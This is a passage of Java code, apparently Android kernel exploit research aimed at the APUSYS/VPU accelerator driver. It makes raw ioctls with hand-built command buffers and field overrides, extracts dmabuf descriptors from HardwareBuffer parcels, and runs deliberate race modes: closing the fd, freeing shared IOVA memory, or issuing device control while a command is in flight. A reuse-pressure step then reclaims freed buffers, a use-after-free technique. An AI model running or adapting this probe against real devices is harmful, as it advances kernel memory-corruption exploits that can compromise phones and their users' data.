                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync,
                                                            int requestFlags,
                                                            boolean includeSettingsProperty,
                                                            Integer codeFirstWordOverride,
                                                            Integer descriptorPayloadSizeOverride,
                                                            Integer requestPriorityOverride,
                                                            Integer requestBufferCountOverride,
                                                            Integer descriptorPortIdOverride,
                                                            Integer descriptorFormatOverride,
                                                            Integer descriptorPlaneCountOverride,
                                                            Integer descriptorHeightOverride,
                                                            Integer outerCodebufSizeOverride,
                                                            Integer dataPayloadWordBaseOverride,
                                                            XrpDataDescEntry[] dataDescEntriesOverride,
                                                            boolean fullCommandCopybackDiff,
                                                            Integer closeApusysFdAfterAsyncMs,
                                                            Integer freeSharedIovaAfterAsyncMs,
                                                            int replacementImportCountAfterFree,
                                                            Integer devCtrlAfterAsyncMs,
                                                            Integer devCtrlControlAfterAsync)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, waitAfterAsync, requestFlags,
            includeSettingsProperty, codeFirstWordOverride,
            descriptorPayloadSizeOverride, requestPriorityOverride,
            requestBufferCountOverride, descriptorPortIdOverride,
            descriptorFormatOverride, descriptorPlaneCountOverride,
            descriptorHeightOverride, outerCodebufSizeOverride,
            dataPayloadWordBaseOverride, dataDescEntriesOverride,
            fullCommandCopybackDiff, closeApusysFdAfterAsyncMs,
            freeSharedIovaAfterAsyncMs, replacementImportCountAfterFree,
            devCtrlAfterAsyncMs, devCtrlControlAfterAsync, false);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync,
                                                            int requestFlags,
                                                            boolean includeSettingsProperty,
                                                            Integer codeFirstWordOverride,
                                                            Integer descriptorPayloadSizeOverride,
                                                            Integer requestPriorityOverride,
                                                            Integer requestBufferCountOverride,
                                                            Integer descriptorPortIdOverride,
                                                            Integer descriptorFormatOverride,
                                                            Integer descriptorPlaneCountOverride,
                                                            Integer descriptorHeightOverride,
                                                            Integer outerCodebufSizeOverride,
                                                            Integer dataPayloadWordBaseOverride,
                                                            XrpDataDescEntry[] dataDescEntriesOverride,
                                                            boolean fullCommandCopybackDiff,
                                                            Integer closeApusysFdAfterAsyncMs,
                                                            Integer freeSharedIovaAfterAsyncMs,
                                                            int replacementImportCountAfterFree,
                                                            Integer devCtrlAfterAsyncMs,
                                                            Integer devCtrlControlAfterAsync,
                                                            boolean pollCompletionAfterAsync)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd VPU IOVA chained probe ===");
        if (xrpSettings) {
            System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
                + " writes a libneuron-style XRP settings buffer into that IOVA,"
                + " then the VPU request references settings/output/data sections.");
            System.out.println("[*] XRP settings shape: " + settingsShape.label
                + " output_size=0x" + Integer.toHexString(settingsShape.outputSize)
                + " data_desc_size=0x"
                + Integer.toHexString(settingsShape.dataDescSize)
                + " include_data_desc=" + settingsShape.includeDataDesc + ".");
            if (splitTargets) {
                System.out.println("[*] Split target: XRP data descriptor and"
                    + " native VPU plane0 MVA point at different IOVA offsets.");
            }
            if (xrpOp.hasCode()) {
                System.out.println("[*] Nonzero XRP code section: opcode="
                    + xrpOp.opcode + " name=" + xrpOp.name
                    + " op_size=0x"
                    + Integer.toHexString(XRP_CODE_OP_SIZE)
                    + " inputs=" + xrpOp.inputCount
                    + " outputs=" + xrpOp.outputCount
                    + " operands=" + xrpOperandListText(xrpOp));
            }
            if (twoVpuBuffers) {
                int printedBufferCount = vpuDescriptorModeUsesFive(descriptorMode)
                    ? 5 : 2;
                String descriptorText =
                    vpuDescriptorModeDescription(descriptorMode, descriptorOrder);
                System.out.println("[*] Native VPU descriptor mode:"
                    + " buffer_count=" + printedBufferCount + ", "
                    + descriptorText);
            }
            if (descriptorMode != VPU_DESC_MINIMAL) {
                System.out.println("[*] VPU descriptor metadata mode: "
                    + vpuDescriptorModeName(descriptorMode));
            }
            if (cmdFlags != XRP_CMD_FLAGS_INITIAL) {
                System.out.println("[*] XRP command flags override: settings[0]=0x"
                    + Integer.toHexString(cmdFlags)
                    + " (wrapper send state uses 0x5).");
            }
            if (settingsLen != XRP_SETTINGS_LEN) {
                System.out.println("[*] VPU request settings length override:"
                    + " request+0x38=0x" + Integer.toHexString(settingsLen)
                    + " (wrapper DSP command buffer size is 0x68).");
            }
            if (!includeSettingsProperty) {
                System.out.println("[*] VPU settings property disabled:"
                    + " request+0x38/request+0x40 are zeroed, matching the"
                    + " target wrapper path where CreateVpuRequest only adds"
                    + " buffers.");
            }
            if (outputHeaderFlag != XRP_OUTPUT_HEADER_FLAG_DEFAULT) {
                System.out.println("[*] XRP output header flag override:"
                    + " output+0x10=0x"
                    + Integer.toHexString(outputHeaderFlag)
                    + " (PrepareOutputHeader(bool) stores this byte).");
            }
            if (requestFlags != VPU_REQUEST_FLAGS_DEFAULT) {
                System.out.println("[*] VPU request flags override:"
                    + " request+0x28=0x" + Integer.toHexString(requestFlags)
                    + " (bit2 selects Preload/slot path in the kernel).");
            }
            if (waitAfterAsync) {
                System.out.println("[*] Wait mode: call mdw_usr_wait_cmd"
                    + " immediately after successful run_cmd_async.");
            }
            if (pollCompletionAfterAsync) {
                System.out.println("[*] Completion poll mode: snapshot"
                    + " settings/output/data-desc before run_cmd_async and"
                    + " busy-poll the same shared buffer immediately after"
                    + " run_cmd_async returns.");
            }
            if (codeFirstWordOverride != null) {
                System.out.println("[*] Code/input first word override:"
                    + " code+0x00=0x"
                    + Integer.toHexString(codeFirstWordOverride));
            }
            if (descriptorPayloadSizeOverride != null) {
                System.out.println("[*] Native descriptor payload size override:"
                    + " size=0x"
                    + Integer.toHexString(descriptorPayloadSizeOverride));
            }
            if (requestPriorityOverride != null) {
                System.out.println("[*] VPU request slot word override:"
                    + " request+0xb68=0x"
                    + Integer.toHexString(requestPriorityOverride)
                    + " (default opcode-4 path rewrites this before D2D_EXT).");
            }
            if (requestBufferCountOverride != null) {
                System.out.println("[*] Native request buffer_count override:"
                    + " request+0x35=0x"
                    + Integer.toHexString(requestBufferCountOverride)
                    + " (D2D_EXT passes this as XTENSA_INFO12).");
            }
            if (descriptorPortIdOverride != null) {
                System.out.println("[*] Native descriptor port-id override:"
                    + " descriptor+0x00=0x"
                    + Integer.toHexString(descriptorPortIdOverride)
                    + " for every emitted descriptor.");
            }
            if (descriptorFormatOverride != null) {
                System.out.println("[*] Native descriptor format override:"
                    + " descriptor+0x01=0x"
                    + Integer.toHexString(descriptorFormatOverride)
                    + " for every emitted descriptor.");
            }
            if (descriptorPlaneCountOverride != null) {
                System.out.println("[*] Native descriptor plane-count override:"
                    + " descriptor+0x02=0x"
                    + Integer.toHexString(descriptorPlaneCountOverride)
                    + " for every emitted descriptor.");
            }
            if (descriptorHeightOverride != null) {
                System.out.println("[*] Native descriptor height override:"
                    + " descriptor+0x08=0x"
                    + Integer.toHexString(descriptorHeightOverride)
                    + " for every emitted descriptor.");
            }
            if (outerCodebufSizeOverride != null) {
                System.out.println("[*] APUSYS subcommand codebuf-size override:"
                    + " sc+0x20=0x"
                    + Integer.toHexString(outerCodebufSizeOverride)
                    + " (mdw copies only this many request bytes into the"
                    + " provider buffer and back out after provider return).");
            }
            if (dataPayloadWordBaseOverride != null) {
                System.out.println("[*] XRP data payload word-base override:"
                    + " data_payload[n]=0x"
                    + Integer.toHexString(dataPayloadWordBaseOverride)
                    + "+n.");
            }
            if (dataDescEntriesOverride != null) {
                System.out.println("[*] XRP data descriptor entries override: "
                    + dataDescEntriesText(dataDescEntriesOverride));
            }
            if (settingsShape.descriptorPlaneOverride != null) {
                System.out.println("[*] Native descriptor plane relationship"
                    + " override:"
                    + settingsShape.descriptorPlaneOverride.toLogString());
            }
            if (fullCommandCopybackDiff) {
                System.out.println("[*] Full command-buffer copyback diff:"
                    + " snapshot request[0..0xb70) before dispatch and"
                    + " classify changed dwords/qwords after wait.");
            }
            if (closeApusysFdAfterAsyncMs != null) {
                System.out.println("[*] Close-race mode: run_cmd_async, skip"
                    + " wait_cmd, sleep "
                    + closeApusysFdAfterAsyncMs.intValue()
                    + "ms, close this APUSYS fd, then keep buffers alive for "
                    + waitMs + "ms before dumping.");
            }
            if (freeSharedIovaAfterAsyncMs != null) {
                System.out.println("[*] Mem-free race mode: run_cmd_async,"
                    + " sleep " + freeSharedIovaAfterAsyncMs.intValue()
                    + "ms, mem_free the shared IOVA buffer while the APUSYS fd"
                    + " stays open, keep buffers alive for " + waitMs
                    + "ms, then issue wait_cmd.");
                if (replacementImportCountAfterFree > 0) {
                    System.out.println("[*] Reuse-pressure mode: immediately"
                        + " import up to "
                        + Math.min(replacementImportCountAfterFree,
                            MAX_REUSE_IMPORTS)
                        + " replacement HardwareBuffers after mem_free and"
                        + " dump them after the completion window.");
                }
            }
            if (devCtrlAfterAsyncMs != null) {
                System.out.println("[*] Dev-ctrl race mode: run_cmd_async,"
                    + " sleep " + devCtrlAfterAsyncMs.intValue()
                    + "ms, issue dev_ctrl(vpu, core0, control0x"
                    + Integer.toHexString(
                        devCtrlControlAfterAsync != null
                            ? devCtrlControlAfterAsync.intValue()
                            : 0)
                    + ") while the"
                    + " APUSYS fd stays open, keep buffers alive for "
                    + waitMs + "ms, then issue wait_cmd.");
            }
        } else {
            System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
                + " then the VPU request references that IOVA in libvpu-style"
                + " settings and plane descriptors.");
        }
        if (!dispatch) {
            System.out.println("[*] Control: command buffer is imported but"
                + " run_cmd_async is skipped before the original buffer dump.");
        }

        loadRuntimeLibraries();

        android.media.ImageReader reader = null;
        android.media.ImageWriter writer = null;
        android.media.Image input = null;
        android.media.Image output = null;
        android.hardware.HardwareBuffer hb = null;
        long memDesc = 0;
        boolean memImported = false;
        boolean apusysFdClosedInProbe = false;
        byte[] commandRequestBefore = null;
        java.nio.ByteBuffer completionPollBuf = null;
        CompletionPollSnapshot completionPollBefore = null;
        int replacementImportLimit = replacementImportCountAfterFree;
        if (replacementImportLimit < 0) {
            replacementImportLimit = 0;
        }
        if (replacementImportLimit > MAX_REUSE_IMPORTS) {
            replacementImportLimit = MAX_REUSE_IMPORTS;
        }
        ReplacementImport[] replacementImports = null;
        try {
            reader = createRgbaImageReader(64, 64);
            writer = android.media.ImageWriter.newInstance(reader.getSurface(), 2);
            input = writer.dequeueInputImage();

            // phase 1: write a zero payload first, just to get the HardwareBuffer fd
            fillImageHeader(input, 0);
            writer.queueInputImage(input);
            input = null;

            output = acquireImage(reader);
            if (output == null) {
                System.out.println("[-] ImageReader did not produce an output image");
                return;
            }
            hb = output.getHardwareBuffer();
            if (hb == null) {
                System.out.println("[-] Image.getHardwareBuffer returned null");
                return;
            }

            // phase 2: extract dmabuf fd from parcel at known offset 388
            android.os.Parcel parcel = android.os.Parcel.obtain();
            int dmaBufFd = -1;
            try {
                hb.writeToParcel(parcel, 0);
                parcel.setDataPosition(388);
                android.os.ParcelFileDescriptor pfd = parcel.readFileDescriptor();
                if (pfd != null) {
                    dmaBufFd = pfd.getFd();
                }
            } finally {
                parcel.recycle();
            }
            if (dmaBufFd < 0) {
                System.out.println("[-] Could not extract dmabuf fd from parcel pos 388");
                return;
            }
            System.out.println("[+] dmabuf fd=" + dmaBufFd);

            // phase 3: mem_create type-2 to import and get IOVA — do NOT free yet
            memDesc = DrmTrigger.sScratchBuf + OFF_MEM_DMABUF;
            DrmTrigger.zeroMem(memDesc, 0x38);
            DrmTrigger.unsafePutInt(memDesc + 0x0c, 0x4000);  // size
            DrmTrigger.unsafePutInt(memDesc + 0x18, 0);        // mem type
            DrmTrigger.unsafePutInt(memDesc + 0x20, dmaBufFd); // fd

            long memRet = DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_CREATE2, memDesc);
            System.out.println("[*] mem_create2_iova cmd=0x"
                + Long.toHexString(APUSYS_CMD_MEM_CREATE2)
                + " ret=" + retText(memRet));
            if (memRet < 0) {
                System.out.println("[-] mem_create2 failed, cannot get IOVA");
                return;
            }
            memImported = true;
            dumpU32Words("mem_create2_iova_desc", memDesc, 0x38);

            int iovaLow = DrmTrigger.unsafeGetInt(memDesc + 0x08);
            int iovaSize = DrmTrigger.unsafeGetInt(memDesc + 0x0c);
            long memId = DrmTrigger.unsafeGetLong(memDesc + 0x28);
            System.out.println("[+] IOVA=0x" + Integer.toHexString(iovaLow)
                + " size=0x" + Integer.toHexString(iovaSize)
                + " mem_id=0x" + Long.toHexString(memId));

            if (xrpSettings) {
                android.media.Image.Plane[] planes = output.getPlanes();
                if (planes == null || planes.length == 0) {
                    System.out.println("[-] original output image has no planes");
                    return;
                }
                java.nio.ByteBuffer originalBuf = planes[0].getBuffer();
                fillXrpSettingsBuffer(originalBuf, iovaLow, iovaSize, xrpOp,
                    cmdFlags, outputHeaderFlag, settingsShape,
                    dataPayloadWordBaseOverride, dataDescEntriesOverride);
                if (codeFirstWordOverride != null && xrpOp.hasCode()) {
                    putU32LE(originalBuf, XRP_CODE_OFF, codeFirstWordOverride);
                }
                dumpXrpWindows("before", originalBuf, xrpOp);
                if (pollCompletionAfterAsync) {
                    completionPollBuf = originalBuf;
                    completionPollBefore = new CompletionPollSnapshot(
                        originalBuf, xrpOp);
                    dumpCompletionPollSnapshot("completion_poll_before_async",
                        completionPollBefore);
                }
            }

            // phase 4: now build a second HardwareBuffer with the VPU+IOVA payload.
            // Keep the first output/hardware buffer alive so its plane can be
            // dumped after execution; mem_create holds the kernel-side mapping.
            android.media.ImageReader reader2 = createRgbaImageReader(64, 64);
            android.media.ImageWriter writer2
                = android.media.ImageWriter.newInstance(reader2.getSurface(), 2);
            android.media.Image input2 = writer2.dequeueInputImage();
            if (xrpSettings) {
                String label;
                if (xrpOp.hasCode()) {
                    String flagsSuffix = cmdFlags == XRP_CMD_FLAGS_INITIAL
                        ? "" : "_flags" + Integer.toHexString(cmdFlags);
                    String orderSuffix = descriptorOrder
                        == VPU_DESC_ORDER_CODE_OUTPUT
                        ? "" : "_" + vpuDescriptorOrderName(descriptorOrder);
                    String settingsLenSuffix = settingsLen == XRP_SETTINGS_LEN
                        ? "" : "_settings" + Integer.toHexString(settingsLen);
                    String outputHeaderSuffix =
                        outputHeaderFlag == XRP_OUTPUT_HEADER_FLAG_DEFAULT
                        ? "" : "_outflag"
                            + Integer.toHexString(outputHeaderFlag);
                    String shapeSuffix = settingsShape == XrpSettingsShape.CURRENT
                        ? "" : "_" + settingsShape.label;
                    label = twoVpuBuffers
                        ? "vpu_xrp_internal_" + xrpOp.label + "_"
                            + vpuDescriptorModeName(descriptorMode)
                            + flagsSuffix + orderSuffix + settingsLenSuffix
                            + outputHeaderSuffix + shapeSuffix + "_iova_apunn"
                        : "vpu_xrp_" + xrpOp.label + flagsSuffix
                            + settingsLenSuffix + outputHeaderSuffix
                            + shapeSuffix + "_iova_apunn";
                } else {
                    label = splitTargets ? "vpu_xrp_split_iova_apunn"
                        : "vpu_xrp_iova_apunn";
                }
                if (requestFlags != VPU_REQUEST_FLAGS_DEFAULT) {
                    label = label + "_req_flags_"
                        + Integer.toHexString(requestFlags);
                }
                if (!includeSettingsProperty) {
                    label = label + "_no_settings_property";
                }
                if (codeFirstWordOverride != null) {
                    label = label + "_codeword_"
                        + Integer.toHexString(codeFirstWordOverride);
                }
                if (descriptorPayloadSizeOverride != null) {
                    label = label + "_descsize_"
                        + Integer.toHexString(descriptorPayloadSizeOverride);
                }
                if (requestPriorityOverride != null) {
                    label = label + "_prio_"
                        + Integer.toHexString(requestPriorityOverride);
                }
                if (requestBufferCountOverride != null) {
                    label = label + "_bufcnt_"
                        + Integer.toHexString(requestBufferCountOverride);
                }
                if (descriptorPortIdOverride != null) {
                    label = label + "_port_"
                        + Integer.toHexString(descriptorPortIdOverride);
                }
                if (descriptorFormatOverride != null) {
                    label = label + "_format_"
                        + Integer.toHexString(descriptorFormatOverride);
                }
                if (descriptorPlaneCountOverride != null) {
                    label = label + "_planes_"
                        + Integer.toHexString(descriptorPlaneCountOverride);
                }
                if (descriptorHeightOverride != null) {
                    label = label + "_height_"
                        + Integer.toHexString(descriptorHeightOverride);
                }
                if (outerCodebufSizeOverride != null) {
                    label = label + "_codebufsize_"
                        + Integer.toHexString(outerCodebufSizeOverride);
                }
                if (dataPayloadWordBaseOverride != null) {
                    label = label + "_datapayload_"
                        + Integer.toHexString(dataPayloadWordBaseOverride);
                }
                fillRunCmdVpuXrpIova(input2, "apu_lib_apunn", label,
                    iovaLow, iovaSize, splitTargets, xrpOp, twoVpuBuffers,
                    descriptorMode, cmdFlags, descriptorOrder, settingsLen,
                    settingsShape, requestFlags, includeSettingsProperty,
                    descriptorPayloadSizeOverride, requestPriorityOverride,
                    requestBufferCountOverride, descriptorPortIdOverride,
                    descriptorFormatOverride, descriptorPlaneCountOverride,
                    descriptorHeightOverride, outerCodebufSizeOverride);
            } else {
                fillRunCmdVpuIova(input2, "apu_lib_apunn", "vpu_iova_apunn",
                    iovaLow, iovaSize);
            }
            writer2.queueInputImage(input2);

            android.media.Image output2 = acquireImage(reader2);
            if (output2 == null) {
                System.out.println("[-] second ImageReader produced no image");
                writer2.close();
                reader2.close();
                return;
            }
            android.hardware.HardwareBuffer hb2 = output2.getHardwareBuffer();
            if (hb2 == null) {
                System.out.println("[-] second HardwareBuffer is null");
                output2.close();
                writer2.close();
                reader2.close();
                return;
            }

            // phase 5: extract fd and run_cmd_async with IOVA-referencing payload
            android.os.Parcel p2 = android.os.Parcel.obtain();
            int cmdFd = -1;
            try {
                hb2.writeToParcel(p2, 0);
                p2.setDataPosition(388);
                android.os.ParcelFileDescriptor pfd2 = p2.readFileDescriptor();
                if (pfd2 != null) {
                    cmdFd = pfd2.getFd();
                }
            } finally {
                p2.recycle();
            }
            if (cmdFd < 0) {
                System.out.println("[-] Could not extract cmd dmabuf fd");
                hb2.close();
                output2.close();
                writer2.close();
                reader2.close();
                return;
            }
            System.out.println("[+] cmd dmabuf fd=" + cmdFd);

            // mem_create for the cmd buffer itself
            long cmdMemDesc = DrmTrigger.sScratchBuf + OFF_MEM_B;
            DrmTrigger.zeroMem(cmdMemDesc, 0x38);
            DrmTrigger.unsafePutInt(cmdMemDesc + 0x0c, 0x4000);
            DrmTrigger.unsafePutInt(cmdMemDesc + 0x18, 0);
            DrmTrigger.unsafePutInt(cmdMemDesc + 0x20, cmdFd);
            long cmdMemRet = DrmTrigger.rawIoctl(apusysFd,
                APUSYS_CMD_MEM_CREATE2, cmdMemDesc);
            System.out.println("[*] mem_create2_cmd cmd=0x"
                + Long.toHexString(APUSYS_CMD_MEM_CREATE2)
                + " ret=" + retText(cmdMemRet));
            if (cmdMemRet < 0) {
                System.out.println("[-] cmd mem_create2 failed");
                hb2.close();
                output2.close();
                writer2.close();
                reader2.close();
                return;
            }
            dumpU32Words("mem_create2_cmd_desc", cmdMemDesc, 0x38);
            if (xrpSettings) {
                android.media.Image.Plane[] cmdPlanes = output2.getPlanes();
                if (cmdPlanes != null && cmdPlanes.length > 0) {
                    java.nio.ByteBuffer cmdBuf = cmdPlanes[0].getBuffer();
                    dumpVpuCommandWindows("before", cmdBuf);
                    if (fullCommandCopybackDiff) {
                        commandRequestBefore = snapshotByteBufferRange(
                            cmdBuf, VPU_REQUEST_OFF, VPU_REQUEST_SIZE);
                    }
                }
            }

            // run_cmd_async
            long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
            DrmTrigger.zeroMem(runCmd, 0x18);
            DrmTrigger.unsafePutInt(runCmd + 0x08, cmdFd);
            DrmTrigger.unsafePutInt(runCmd + 0x10, 0x4000);
            dumpU32Words("run_cmd_arg_before_async", runCmd, 0x18);
            long runRet = Long.MIN_VALUE;
            if (dispatch) {
                long asyncStartMs = System.currentTimeMillis();
                runRet = DrmTrigger.rawIoctl(apusysFd,
                    APUSYS_CMD_RUN_ASYNC, runCmd);
                long asyncElapsedMs = System.currentTimeMillis() - asyncStartMs;
                System.out.println("[*] run_async_vpu_iova cmd=0x"
                    + Long.toHexString(APUSYS_CMD_RUN_ASYNC)
                    + " ret=" + retText(runRet)
                    + " elapsed_ms=" + asyncElapsedMs);
                dumpU32Words("run_cmd_arg_after_async", runCmd, 0x18);
                if (pollCompletionAfterAsync && runRet >= 0) {
                    if (completionPollBuf != null
                            && completionPollBefore != null) {
                        pollXrpCompletionWindow(
                            xrpOp.label + "_" + settingsShape.label,
                            completionPollBuf, xrpOp, completionPollBefore);
                    } else {
                        System.out.println("[-] completion_poll unavailable:"
                            + " shared buffer snapshot missing");
                    }
                    long waitStartMs = System.currentTimeMillis();
                    long waitRet = DrmTrigger.rawIoctl(apusysFd,
                        APUSYS_CMD_WAIT, runCmd);
                    long waitElapsedMs = System.currentTimeMillis()
                        - waitStartMs;
                    System.out.println("[*] wait_after_completion_poll_vpu_iova"
                        + " cmd=0x" + Long.toHexString(APUSYS_CMD_WAIT)
                        + " ret=" + retText(waitRet)
                        + " elapsed_ms=" + waitElapsedMs);
                    dumpU32Words("run_cmd_arg_after_completion_poll_wait",
                        runCmd, 0x18);
                } else if (freeSharedIovaAfterAsyncMs != null && runRet >= 0) {
                    int freeDelayMs = freeSharedIovaAfterAsyncMs.intValue();
                    System.out.println("[*] mem-free-race: sleeping "
                        + freeDelayMs
                        + "ms before freeing shared IOVA after async submit");
                    Thread.sleep(freeDelayMs);
                    long freeRet = DrmTrigger.rawIoctl(apusysFd,
                        APUSYS_CMD_MEM_FREE_02, memDesc);
                    System.out.println("[*] mem_free_shared_iova_after_async"
                        + " cmd=0x"
                        + Long.toHexString(APUSYS_CMD_MEM_FREE_02)
                        + " ret=" + retText(freeRet));
                    dumpU32Words("mem_free_shared_iova_desc_after_async",
                        memDesc, 0x38);
                    if (freeRet >= 0) {
                        memImported = false;
                        if (replacementImportLimit > 0) {
                            replacementImports =
                                new ReplacementImport[replacementImportLimit];
                            System.out.println("[*] reuse-pressure: importing "
                                + replacementImportLimit
                                + " replacement HardwareBuffers after shared"
                                + " IOVA free");
                            for (int ri = 0; ri < replacementImportLimit; ri++) {
                                replacementImports[ri] =
                                    createReplacementImport(apusysFd, ri,
                                        iovaLow, iovaSize, xrpOp);
                            }
                        }
                    }
                } else if (closeApusysFdAfterAsyncMs != null && runRet >= 0) {
                    int closeDelayMs = closeApusysFdAfterAsyncMs.intValue();
                    System.out.println("[*] close-race: sleeping "
                        + closeDelayMs
                        + "ms before closing APUSYS fd after async submit");
                    Thread.sleep(closeDelayMs);
                    DrmTrigger.closeFd(apusysFd);
                    apusysFdClosedInProbe = true;
                    System.out.println("[*] close-race: closed APUSYS fd;"
                        + " mdw_usr_destroy should own residual cmd/mem cleanup");
                } else if (devCtrlAfterAsyncMs != null && runRet >= 0) {
                    int devCtrlDelayMs = devCtrlAfterAsyncMs.intValue();
                    int devCtrlControl = devCtrlControlAfterAsync != null
                        ? devCtrlControlAfterAsync.intValue() : 0;
                    System.out.println("[*] dev-ctrl-race: sleeping "
                        + devCtrlDelayMs
                        + "ms before device-control ioctl control=0x"
                        + Integer.toHexString(devCtrlControl)
                        + " after async submit");
                    Thread.sleep(devCtrlDelayMs);
                    long devCtrlRet = probeDevCtrl(apusysFd,
                        "vpu_race", 0x03, 0, devCtrlControl);
                    System.out.println("[*] dev_ctrl_after_async_vpu_iova"
                        + "_ctrl0x" + Integer.toHexString(devCtrlControl)
                        + " ret=" + retText(devCtrlRet));
                } else if (waitAfterAsync && runRet >= 0) {
                    long waitStartMs = System.currentTimeMillis();
                    long waitRet = DrmTrigger.rawIoctl(apusysFd,
                        APUSYS_CMD_WAIT, runCmd);
                    long waitElapsedMs = System.currentTimeMillis()
                        - waitStartMs;
                    System.out.println("[*] wait_vpu_iova cmd=0x"
                        + Long.toHexString(APUSYS_CMD_WAIT)
                        + " ret=" + retText(waitRet)
                        + " elapsed_ms=" + waitElapsedMs);
                    dumpU32Words("run_cmd_arg_after_wait", runCmd, 0x18);
                }
            } else {
                System.out.println("[*] run_async_vpu_iova skipped by control mode");
            }

            // wait a bit for VPU timeout / completion
            System.out.println("[*] Waiting " + waitMs
                + "ms before original buffer dump...");
            Thread.sleep(waitMs);

            // dump the original imported buffer to see if VPU wrote anything back
            System.out.println("[*] Dumping original IOVA buffer post-execution:");
            if (output != null) {
                android.media.Image.Plane[] planes = output.getPlanes();
                if (planes != null && planes.length > 0) {
                    java.nio.ByteBuffer buf = planes[0].getBuffer();
                    if (xrpSettings) {
                        dumpXrpWindows("after", buf, xrpOp);
                    } else {
                        dumpByteBuffer("original_iova_buf", buf, 0x80);
                    }
                }
            }
            if (xrpSettings && output2 != null) {
                android.media.Image.Plane[] cmdPlanes = output2.getPlanes();
                if (cmdPlanes != null && cmdPlanes.length > 0) {
                    System.out.println("[*] Dumping command buffer post-execution:");
                    java.nio.ByteBuffer cmdBuf = cmdPlanes[0].getBuffer();
                    dumpVpuCommandWindows("after", cmdBuf);
                    if (fullCommandCopybackDiff
                            && commandRequestBefore != null) {
                        dumpVpuCommandRequestDiff(
                            "vpu_cmd_request_copyback_diff",
                            commandRequestBefore, cmdBuf, iovaLow, iovaSize);
                    }
                }
            }
            if (replacementImports != null) {
                System.out.println("[*] Dumping replacement IOVA buffers"
                    + " post-execution:");
                for (int ri = 0; ri < replacementImports.length; ri++) {
                    dumpReplacementImport("after", replacementImports[ri],
                        iovaLow, xrpOp);
                }
            }
            if (freeSharedIovaAfterAsyncMs != null && runRet >= 0
                    && !apusysFdClosedInProbe) {
                long waitRet = DrmTrigger.rawIoctl(apusysFd,
                    APUSYS_CMD_WAIT, runCmd);
                System.out.println("[*] wait_after_mem_free_vpu_iova cmd=0x"
                    + Long.toHexString(APUSYS_CMD_WAIT)
                    + " ret=" + retText(waitRet));
                dumpU32Words("run_cmd_arg_after_mem_free_wait", runCmd, 0x18);
            }
            if (devCtrlAfterAsyncMs != null && runRet >= 0
                    && !apusysFdClosedInProbe) {
                long waitRet = DrmTrigger.rawIoctl(apusysFd,
                    APUSYS_CMD_WAIT, runCmd);
                System.out.println("[*] wait_after_dev_ctrl_vpu_iova cmd=0x"
                    + Long.toHexString(APUSYS_CMD_WAIT)
                    + " ret=" + retText(waitRet));
                dumpU32Words("run_cmd_arg_after_dev_ctrl_wait", runCmd, 0x18);
            }

            // cleanup cmd mem
            if (apusysFdClosedInProbe) {
                System.out.println("[*] close-race: skipping cmd mem_free"
                    + " because APUSYS fd is already closed");
            } else {
                DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_FREE_02, cmdMemDesc);
                System.out.println("[*] cmd mem_create2 freed");
            }

            hb2.close();
            output2.close();
            writer2.close();
            reader2.close();

        } finally {
            // phase 6: cleanup IOVA mem
            if (replacementImports != null) {
                for (int ri = 0; ri < replacementImports.length; ri++) {
                    cleanupReplacementImport(apusysFd, replacementImports[ri],
                        apusysFdClosedInProbe);
                }
            }
            if (memImported) {
                if (apusysFdClosedInProbe) {
                    System.out.println("[*] close-race: skipping IOVA mem_free"
                        + " because APUSYS fd is already closed");
                } else {
                    DrmTrigger.rawIoctl(apusysFd,
                        APUSYS_CMD_MEM_FREE_02, memDesc);
                    System.out.println("[*] IOVA mem_create2 freed");
                }
            }
            if (closeApusysFdAfterAsyncMs != null && !apusysFdClosedInProbe) {
                DrmTrigger.closeFd(apusysFd);
                System.out.println("[*] close-race: closed APUSYS fd during"
                    + " probe cleanup");
            }
            if (hb != null) hb.close();
            if (output != null) output.close();
            if (input != null) input.close();
            if (writer != null) writer.close();
            if (reader != null) reader.close();
        }
    }

    private static void runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(
            int apusysFd, boolean dispatch, int descriptorMode) throws Exception {
        runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(apusysFd, dispatch,
            descriptorMode, XRP_CMD_FLAGS_INITIAL);
    }

    private static void runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(
            int apusysFd, boolean dispatch, int descriptorMode, int cmdFlags)
            throws Exception {
        runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(apusysFd, dispatch,
            descriptorMode, cmdFlags, VPU_DESC_ORDER_CODE_OUTPUT);
    }

    private static void runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(
            int apusysFd, boolean dispatch, int descriptorMode, int cmdFlags,
            int descriptorOrder)
            throws Exception {
        runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(apusysFd, dispatch,
            descriptorMode, cmdFlags, descriptorOrder, XRP_SETTINGS_LEN);
    }

    private static void runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(
            int apusysFd, boolean dispatch, int descriptorMode, int cmdFlags,
            int descriptorOrder, int settingsLen)
            throws Exception {
        runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(apusysFd, dispatch,
            descriptorMode, cmdFlags, descriptorOrder, settingsLen,
            XRP_OUTPUT_HEADER_FLAG_DEFAULT);
    }

    private static void runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(
            int apusysFd, boolean dispatch, int descriptorMode, int cmdFlags,
            int descriptorOrder, int settingsLen, int outputHeaderFlag)
            throws Exception {
